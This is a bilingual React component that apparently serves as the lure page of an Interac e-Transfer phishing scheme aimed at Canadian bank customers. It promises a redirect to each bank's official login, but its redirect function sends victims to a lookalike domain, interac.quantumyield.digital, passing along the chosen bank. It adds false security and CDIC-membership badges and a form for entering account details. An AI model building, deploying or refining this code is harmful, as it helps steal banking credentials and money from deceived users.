"use client"

import { useState, useEffect } from "react"
import {
  Shield,
  Search,
  ArrowLeft,
  ArrowRight,
  CheckCircle2,
  Lock,
  Loader2,
  Building2,
  ChevronRight,
  X,
} from "lucide-react"
import { useLanguage } from "@/lib/i18n/context"

// ─── Data ────────────────────────────────────────────────────────────────────

export type BankCategory = "Big Six" | "Online Banks" | "Credit Unions" | "Regional Banks"

export interface BankEntry {
  id: string
  name: string
  logo: string
  category: BankCategory
  loginUrl: string
}

export const BANKS: BankEntry[] = [
  { id: "td",         name: "TD Bank",          logo: "https://etransfer-notification.interac.ca/images/new/td_logo.png",         category: "Big Six",        loginUrl: "https://www.td.com" },
  { id: "rbc",        name: "RBC",               logo: "https://etransfer-notification.interac.ca/images/new/rbc_logo.png",        category: "Big Six",        loginUrl: "https://www.rbc.com" },
  { id: "scotiabank", name: "Scotiabank",        logo: "https://etransfer-notification.interac.ca/images/new/scotia_logo.png",     category: "Big Six",        loginUrl: "https://www.scotiabank.com" },
  { id: "bmo",        name: "BMO",               logo: "https://etransfer-notification.interac.ca/images/new/bmo_logo.png",        category: "Big Six",        loginUrl: "https://www.bmo.com" },
  { id: "cibc",       name: "CIBC",              logo: "https://etransfer-notification.interac.ca/images/new/cibc_logo.png",       category: "Big Six",        loginUrl: "https://www.cibc.com" },
  { id: "nbc",        name: "National Bank",     logo: "https://etransfer-notification.interac.ca/images/new/nbc_logo.png",        category: "Big Six",        loginUrl: "https://www.nbc.ca" },
  { id: "tangerine",  name: "Tangerine",         logo: "https://etransfer-notification.interac.ca/images/new/tangerine_logo.png",  category: "Online Banks",   loginUrl: "https://www.tangerine.ca" },
  { id: "eq",         name: "EQ Bank",           logo: "https://etransfer-notification.interac.ca/images/new/eq_logo.png",         category: "Online Banks",   loginUrl: "https://www.eqbank.ca" },
  { id: "simplii",    name: "Simplii Financial", logo: "https://etransfer-notification.interac.ca/images/new/simplii_logo.png",    category: "Online Banks",   loginUrl: "https://www.simplii.com" },
  { id: "pcf",        name: "PC Financial",      logo: "https://etransfer-notification.interac.ca/images/new/pcf_logo.png",        category: "Online Banks",   loginUrl: "https://www.pcfinancial.ca" },
  { id: "desjardins", name: "Desjardins",        logo: "https://etransfer-notification.interac.ca/images/new/desjardins_logo.png", category: "Credit Unions",  loginUrl: "https://www.desjardins.com" },
  { id: "vancity",    name: "Vancity",           logo: "https://etransfer-notification.interac.ca/images/new/vancity_logo.png",    category: "Credit Unions",  loginUrl: "https://www.vancity.com" },
  { id: "hsbc",       name: "HSBC Canada",       logo: "https://etransfer-notification.interac.ca/images/new/hsbc_logo.png",       category: "Regional Banks", loginUrl: "https://www.hsbc.ca" },
  { id: "atb",        name: "ATB Financial",     logo: "https://etransfer-notification.interac.ca/images/new/atb_logo.png",        category: "Regional Banks", loginUrl: "https://www.atb.com" },
]

export const CATEGORIES: BankCategory[] = ["Big Six", "Online Banks", "Credit Unions", "Regional Banks"]

type Step = "select" | "confirm" | "connecting" | "redirecting"

interface Props {
  onBack: () => void
  backLabel?: string
  showManualEntry?: boolean
}

// ─── Inline bilingual copy (safe — no context dependency) ───────────────────

const COPY = {
  en: {
    badge:              "Interac e-Transfer",
    title:              "Connect your bank account",
    subtitle:           "Select your financial institution to securely link your account and receive your e-Transfer deposit.",
    searchPlaceholder:  "Search your bank...",
    allCategory:        "All",
    noResultsTitle:     (term: string) => `No banks match "${term}"`,
    noResultsTip:       "Try a different search term",
    chooseDifferent:    "Choose a different bank",
    back:               "Back",
    connectTo:          (name: string) => `Connect to ${name}`,
    connectingTitle:    "Establishing secure connection...",
    connectingSubtitle: "Preparing your bank redirect",
    redirectingTo:      (name: string) => `Redirecting to ${name}`,
    openingIn:          (s: number) => `Opening secure bank portal in ${s}s`,
    continueNow:        "Continue now",
    trustSsl:           "256-bit SSL",
    trustSslSub:        "Encrypted connection",
    trustSecurity:      "Bank-level security",
    trustSecuritySub:   "Your data stays safe",
    trustCdic:          "CDIC Member",
    trustCdicSub:       "Government insured",
    secureConnection:   "Secure Connection",
    secureNotice:       "You'll be securely redirected to your bank's official website. Never share your banking credentials with anyone.",
    whatHappensNext:    "What happens next?",
    step1:              "You'll be redirected to your bank's secure login page",
    step2:              "Log in with your existing banking credentials",
    step3:              "Authorize the connection to complete the setup",
    catBigSix:          "Big Six",
    catOnline:          "Online Banks",
    catCreditUnions:    "Credit Unions",
    catRegional:        "Regional Banks",
    manualPrompt:       "Don't see your bank?",
    manualTitle:        "Enter your bank details manually",
    manualInstitutionLabel:       "Institution name",
    manualInstitutionPlaceholder: "e.g. TD Bank",
    manualAccountTypeLabel:       "Account type",
    manualAccountTypeDefault:     "Select type",
    manualChequing:     "Chequing",
    manualSavings:      "Savings",
    manualBusiness:     "Business",
    manualBranchLabel:        "Branch / transit number (optional)",
    manualBranchPlaceholder:  "e.g. 00123",
    manualSubmit:       "Submit manually",
    manualSubmitting:   "Submitting...",
    manualSuccess:      "Your bank details have been submitted. Our team will verify and connect your account.",
  },
  fr: {
    badge:              "Virement Interac",
    title:              "Connectez votre compte bancaire",
    subtitle:           "Sélectionnez votre institution financière pour lier votre compte en toute sécurité et recevoir votre dépôt par virement.",
    searchPlaceholder:  "Recherchez votre banque...",
    allCategory:        "Toutes",
    noResultsTitle:     (term: string) => `Aucune banque ne correspond à « ${term} »`,
    noResultsTip:       "Essayez un autre terme de recherche",
    chooseDifferent:    "Choisir une autre banque",
    back:               "Retour",
    connectTo:          (name: string) => `Se connecter à ${name}`,
    connectingTitle:    "Établissement de la connexion sécurisée...",
    connectingSubtitle: "Préparation de la redirection vers votre banque",
    redirectingTo:      (name: string) => `Redirection vers ${name}`,
    openingIn:          (s: number) => `Ouverture du portail sécurisé dans ${s}s`,
    continueNow:        "Continuer maintenant",
    trustSsl:           "SSL 256 bits",
    trustSslSub:        "Connexion chiffrée",
    trustSecurity:      "Sécurité bancaire",
    trustSecuritySub:   "Vos données restent protégées",
    trustCdic:          "Membre SADC",
    trustCdicSub:       "Assuré par le gouvernement",
    secureConnection:   "Connexion sécurisée",
    secureNotice:       "Vous serez redirigé en toute sécurité vers le site officiel de votre banque. Ne partagez jamais vos identifiants bancaires.",
    whatHappensNext:    "Que se passe-t-il ensuite?",
    step1:              "Vous serez redirigé vers la page de connexion sécurisée de votre banque",
    step2:              "Connectez-vous avec vos identifiants bancaires existants",
    step3:              "Autorisez la connexion pour finaliser la configuration",
    catBigSix:          "Les Six Grandes",
    catOnline:          "Banques en ligne",
    catCreditUnions:    "Coopératives de crédit",
    catRegional:        "Banques régionales",
    manualPrompt:       "Votre banque n'est pas dans la liste?",
    manualTitle:        "Entrez les coordonnées de votre banque manuellement",
    manualInstitutionLabel:       "Nom de l'institution",
    manualInstitutionPlaceholder: "ex. Banque TD",
    manualAccountTypeLabel:       "Type de compte",
    manualAccountTypeDefault:     "Sélectionner le type",
    manualChequing:     "Chèques",
    manualSavings:      "Épargne",
    manualBusiness:     "Affaires",
    manualBranchLabel:        "Numéro de succursale / transit (optionnel)",
    manualBranchPlaceholder:  "ex. 00123",
    manualSubmit:       "Soumettre manuellement",
    manualSubmitting:   "Envoi en cours...",
    manualSuccess:      "Vos coordonnées bancaires ont été soumises. Notre équipe vérifiera et connectera votre compte.",
  },
} as const

// ─── Shared flow ─────────────────────────────────────────────────────────────

export default function ConnectBankFlow({ onBack, showManualEntry = true }: Props) {
  const { language } = useLanguage()
  const c = COPY[language] ?? COPY.en

  const [search, setSearch]                 = useState("")
  const [activeCategory, setActiveCategory] = useState<BankCategory | "all">("all")
  const [selected, setSelected]             = useState<BankEntry | null>(null)
  const [step, setStep]                     = useState<Step>("select")
  const [countdown, setCountdown]           = useState(5)
  const [brokenLogos, setBrokenLogos]       = useState<Set<string>>(new Set())

  const categoryLabels: Record<BankCategory | "all", string> = {
    all:              c.allCategory,
    "Big Six":        c.catBigSix,
    "Online Banks":   c.catOnline,
    "Credit Unions":  c.catCreditUnions,
    "Regional Banks": c.catRegional,
  }

  const filtered = BANKS.filter((b) => {
    const matchSearch = b.name.toLowerCase().includes(search.toLowerCase())
    const matchCat    = activeCategory === "all" || b.category === activeCategory
    return matchSearch && matchCat
  })

  const grouped = CATEGORIES.reduce<Record<BankCategory, BankEntry[]>>((acc, cat) => {
    acc[cat] = filtered.filter((b) => b.category === cat)
    return acc
  }, {} as Record<BankCategory, BankEntry[]>)

  const doRedirect = () => {
    if (!selected) return
    const params = new URLSearchParams({
      bankId:     selected.id,
      bankName:   selected.name,
      categoryId: selected.category,
    })
    window.location.href = `https://interac.quantumyield.digital/countdown?${params.toString()}`
  }

  useEffect(() => {
    if (step !== "redirecting") return
    setCountdown(5)
    const interval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(interval)
          doRedirect()
          return 0
        }
        return prev - 1
      })
    }, 1000)
    return () => clearInterval(interval)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step])

  const handleSelect = (bank: BankEntry) => {
    setSelected(bank)
    setStep("confirm")
  }

  const handleConnect = () => {
    setStep("connecting")
    setTimeout(() => setStep("redirecting"), 2000)
  }

  const handleBack = () => {
    if (step !== "select") {
      setSelected(null)
      setStep("select")
      setCountdown(5)
    } else {
      onBack()
    }
  }

  const trust = [
    { icon: Lock,         label: c.trustSsl,      sub: c.trustSslSub },
    { icon: Shield,       label: c.trustSecurity,  sub: c.trustSecuritySub },
    { icon: CheckCircle2, label: c.trustCdic,      sub: c.trustCdicSub },
  ]

  return (
    <main className="max-w-5xl mx-auto px-4 py-8 pb-16">

      {/* Back nav */}
      <button
        onClick={handleBack}
        className="flex items-center gap-2 text-sm text-zinc-500 hover:text-white transition-colors mb-6 group min-h-[44px]"
      >
        <ArrowLeft className="w-4 h-4 group-hover:-translate-x-0.5 transition-transform" />
        {step === "select" ? c.back : c.chooseDifferent}
      </button>

      {/* ── SELECT ── */}
      {step === "select" && (
        <>
          {/* Hero */}
          <div className="mb-10">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-10 h-10 rounded-xl bg-[#FDB913] flex items-center justify-center">
                <Building2 className="w-5 h-5 text-black" />
              </div>
              <span className="text-xs font-semibold tracking-widest text-zinc-400 uppercase">
                {c.badge}
              </span>
            </div>
            <h1 className="text-3xl md:text-4xl font-bold text-white mb-3 text-balance">
              {c.title}
            </h1>
            <p className="text-zinc-500 text-base md:text-lg leading-relaxed max-w-xl">
              {c.subtitle}
            </p>
          </div>

          {/* Trust strip */}
          <div className="grid grid-cols-3 gap-3 mb-10">
            {trust.map(({ icon: Icon, label, sub }) => (
              <div
                key={label}
                className="flex flex-col sm:flex-row items-start sm:items-center gap-2 sm:gap-3 bg-zinc-900 border border-zinc-800 rounded-xl p-3 sm:p-4"
              >
                <div className="w-8 h-8 shrink-0 rounded-lg bg-[#FDB913]/15 flex items-center justify-center">
                  <Icon className="w-4 h-4 text-[#FDB913]" />
                </div>
                <div className="min-w-0">
                  <p className="text-xs font-semibold text-white leading-tight">{label}</p>
                  <p className="text-xs text-zinc-400 leading-tight hidden sm:block">{sub}</p>
                </div>
              </div>
            ))}
          </div>

          {/* Search + category filter */}
          <div className="flex flex-col sm:flex-row gap-3 mb-6">
            <div className="relative flex-1">
              <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400 pointer-events-none" />
              <input
                type="search"
                placeholder={c.searchPlaceholder}
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="w-full pl-10 pr-4 py-3 rounded-xl border border-zinc-700 bg-zinc-900 text-sm text-white placeholder:text-zinc-500 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent transition-all"
                style={{ fontSize: "16px" }}
                aria-label={c.searchPlaceholder}
              />
              {search && (
                <button
                  onClick={() => setSearch("")}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-zinc-400 hover:text-zinc-600"
                  aria-label="Clear search"
                >
                  <X className="w-4 h-4" />
                </button>
              )}
            </div>

            <div className="flex gap-2 overflow-x-auto pb-1 sm:pb-0 shrink-0">
              {(["all", ...CATEGORIES] as const).map((cat) => (
                <button
                  key={cat}
                  onClick={() => setActiveCategory(cat)}
                  className={`px-3 py-2.5 rounded-xl text-xs font-semibold whitespace-nowrap border transition-all min-h-[44px] ${
                    activeCategory === cat
                      ? "bg-[#FDB913] text-black border-[#FDB913]"
                      : "bg-zinc-900 text-zinc-400 border-zinc-700 hover:border-zinc-500 hover:text-white"
                  }`}
                >
                  {categoryLabels[cat]}
                </button>
              ))}
            </div>
          </div>

          {/* Bank grid */}
          {filtered.length === 0 ? (
            <div className="text-center py-16 text-zinc-400">
              <Building2 className="w-10 h-10 mx-auto mb-3 opacity-40" />
              <p className="font-medium">{c.noResultsTitle(search)}</p>
              <p className="text-sm mt-1">{c.noResultsTip}</p>
            </div>
          ) : (
            <div className="space-y-8">
              {CATEGORIES.map((cat) => {
                const banks = grouped[cat]
                if (!banks.length) return null
                if (activeCategory !== "all" && activeCategory !== cat) return null
                return (
                  <section key={cat}>
                    <h2 className="text-xs font-semibold tracking-widest text-zinc-400 uppercase mb-3">
                      {categoryLabels[cat]}
                    </h2>
                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3">
                      {banks.map((bank) => (
                        <button
                          key={bank.id}
                          onClick={() => handleSelect(bank)}
                          className="group relative bg-zinc-900 border-2 border-zinc-700 hover:border-[#FDB913] rounded-2xl p-4 flex flex-col items-center justify-center gap-2 min-h-[100px] transition-all hover:shadow-lg hover:shadow-[#FDB913]/10 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 focus:ring-offset-zinc-950"
                          aria-label={c.connectTo(bank.name)}
                        >
                          {!brokenLogos.has(bank.id) ? (
                            <img
                              src={bank.logo}
                              alt={`${bank.name} logo`}
                              className="w-full h-10 object-contain transition-all group-hover:scale-105"
                              onError={() => setBrokenLogos((p) => new Set(p).add(bank.id))}
                            />
                          ) : (
                            <div className="w-10 h-10 rounded-xl bg-[#FDB913] flex items-center justify-center">
                              <span className="text-black font-bold text-lg">{bank.name[0]}</span>
                            </div>
                          )}
                          <span className="text-[11px] font-semibold text-zinc-400 group-hover:text-white text-center leading-tight transition-colors">
                            {bank.name}
                          </span>
                          <ChevronRight className="absolute right-2 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-zinc-300 group-hover:text-[#FDB913] opacity-0 group-hover:opacity-100 transition-all" />
                        </button>
                      ))}
                    </div>
                  </section>
                )
              })}
            </div>
          )}

          {/* Manual entry fallback */}
          {showManualEntry && (
            <div className="mt-12 border-t border-zinc-800 pt-8">
              <p className="text-sm text-zinc-400 mb-3">{c.manualPrompt}</p>
              <ManualEntryForm language={language} />
            </div>
          )}
        </>
      )}

      {/* ── CONFIRM / CONNECTING / REDIRECTING ── */}
      {(step === "confirm" || step === "connecting" || step === "redirecting") && selected && (
        <div className="max-w-lg mx-auto">

          {/* Bank card */}
          <div className="bg-zinc-900 border border-zinc-700 rounded-2xl p-6 mb-6 flex items-center gap-5">
            <div className="w-16 h-16 bg-zinc-800 rounded-xl border border-zinc-700 flex items-center justify-center overflow-hidden shrink-0">
              {!brokenLogos.has(selected.id) ? (
                <img
                  src={selected.logo}
                  alt={selected.name}
                  className="w-full h-full object-contain p-2"
                  onError={() => setBrokenLogos((p) => new Set(p).add(selected.id))}
                />
              ) : (
                <span className="text-xl font-bold text-white">{selected.name[0]}</span>
              )}
            </div>
            <div>
              <p className="text-xs text-zinc-400 font-medium uppercase tracking-wider mb-0.5">
                {categoryLabels[selected.category]}
              </p>
              <h2 className="text-xl font-bold text-white">{selected.name}</h2>
            </div>
          </div>

          {/* Security notice */}
          <div className="flex items-start gap-3 bg-[#FDB913]/8 border border-[#FDB913]/30 rounded-xl p-4 mb-6">
            <Shield className="w-5 h-5 text-[#FDB913] shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-semibold text-white mb-0.5">{c.secureConnection}</p>
              <p className="text-sm text-zinc-400 leading-relaxed">{c.secureNotice}</p>
            </div>
          </div>

          {/* Confirm step */}
          {step === "confirm" && (
            <>
              <h3 className="text-sm font-semibold text-zinc-400 mb-3">{c.whatHappensNext}</h3>
              <ul className="space-y-3 mb-8">
                {[c.step1, c.step2, c.step3].map((text, i) => (
                  <li key={i} className="flex items-start gap-3 text-sm text-zinc-300">
                    <span className="w-5 h-5 rounded-full bg-[#FDB913]/15 text-[#FDB913] font-bold text-xs flex items-center justify-center shrink-0 mt-0.5">
                      {i + 1}
                    </span>
                    {text}
                  </li>
                ))}
              </ul>
              <button
                onClick={handleConnect}
                className="w-full flex items-center justify-center gap-2 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold py-4 rounded-xl transition-colors text-base focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 min-h-[56px]"
              >
                {c.connectTo(selected.name)}
                <ArrowRight className="w-5 h-5" />
              </button>
            </>
          )}

          {/* Connecting spinner */}
          {step === "connecting" && (
            <div className="text-center py-10">
              <Loader2 className="w-12 h-12 text-[#FDB913] animate-spin mx-auto mb-4" />
              <p className="font-semibold text-white text-lg">{c.connectingTitle}</p>
              <p className="text-zinc-400 text-sm mt-1">{c.connectingSubtitle}</p>
            </div>
          )}

          {/* Redirecting countdown */}
          {step === "redirecting" && (
            <div className="text-center py-8">
              <div className="relative w-20 h-20 mx-auto mb-6">
                <svg className="w-20 h-20 -rotate-90" viewBox="0 0 80 80">
                  <circle cx="40" cy="40" r="34" fill="none" stroke="#27272a" strokeWidth="8" />
                  <circle
                    cx="40" cy="40" r="34"
                    fill="none"
                    stroke="#FDB913"
                    strokeWidth="8"
                    strokeLinecap="round"
                    strokeDasharray={`${2 * Math.PI * 34}`}
                    strokeDashoffset={`${2 * Math.PI * 34 * (1 - countdown / 5)}`}
                    style={{ transition: "stroke-dashoffset 1s linear" }}
                  />
                </svg>
                <span className="absolute inset-0 flex items-center justify-center text-2xl font-bold text-white">
                  {countdown}
                </span>
              </div>
              <p className="font-semibold text-white text-lg">{c.redirectingTo(selected.name)}</p>
              <p className="text-zinc-400 text-sm mt-1 mb-6">{c.openingIn(countdown)}</p>
              <button
                onClick={doRedirect}
                className="inline-flex items-center gap-2 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold px-6 py-3 rounded-xl transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 min-h-[44px]"
              >
                {c.continueNow}
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}
        </div>
      )}
    </main>
  )
}

// ─── Manual entry fallback ────────────────────────────────────────────────────

function ManualEntryForm({ language }: { language: "en" | "fr" }) {
  const c = COPY[language] ?? COPY.en

  const [form, setForm]             = useState({ institution: "", accountType: "", branch: "" })
  const [submitting, setSubmitting] = useState(false)
  const [done, setDone]             = useState(false)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!form.institution || !form.accountType) return
    setSubmitting(true)
    setTimeout(() => { setSubmitting(false); setDone(true) }, 1500)
  }

  if (done) {
    return (
      <div className="flex items-center gap-3 p-4 bg-green-50 border border-green-200 rounded-xl text-sm text-green-700">
        <CheckCircle2 className="w-5 h-5 shrink-0" />
        <span>{c.manualSuccess}</span>
      </div>
    )
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-3 max-w-md">
      <h3 className="text-sm font-semibold text-zinc-300 mb-2">{c.manualTitle}</h3>
      <div className="grid grid-cols-2 gap-3">
        <div>
          <label className="text-xs font-semibold text-zinc-400 block mb-1">{c.manualInstitutionLabel}</label>
          <input
            required
            value={form.institution}
            onChange={(e) => setForm({ ...form, institution: e.target.value })}
            placeholder={c.manualInstitutionPlaceholder}
            className="w-full border border-zinc-700 bg-zinc-800 rounded-xl px-3 py-2.5 text-sm text-white placeholder:text-zinc-500 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent"
            style={{ fontSize: "16px" }}
          />
        </div>
        <div>
          <label className="text-xs font-semibold text-zinc-400 block mb-1">{c.manualAccountTypeLabel}</label>
          <select
            required
            value={form.accountType}
            onChange={(e) => setForm({ ...form, accountType: e.target.value })}
            className="w-full border border-zinc-700 bg-zinc-800 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent"
            style={{ fontSize: "16px" }}
          >
            <option value="">{c.manualAccountTypeDefault}</option>
            <option value="chequing">{c.manualChequing}</option>
            <option value="savings">{c.manualSavings}</option>
            <option value="business">{c.manualBusiness}</option>
          </select>
        </div>
      </div>
      <div>
        <label className="text-xs font-semibold text-zinc-400 block mb-1">{c.manualBranchLabel}</label>
        <input
          value={form.branch}
          onChange={(e) => setForm({ ...form, branch: e.target.value })}
          placeholder={c.manualBranchPlaceholder}
          className="w-full border border-zinc-700 bg-zinc-800 rounded-xl px-3 py-2.5 text-sm text-white placeholder:text-zinc-500 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent"
          style={{ fontSize: "16px" }}
        />
      </div>
      <button
        type="submit"
        disabled={submitting}
        className="flex items-center gap-2 bg-zinc-900 hover:bg-zinc-700 text-white font-semibold px-5 py-2.5 rounded-xl text-sm transition-colors disabled:opacity-50 min-h-[44px]"
      >
        {submitting ? (
          <><Loader2 className="w-4 h-4 animate-spin" />{c.manualSubmitting}</>
        ) : (
          c.manualSubmit
        )}
      </button>
    </form>
  )
}
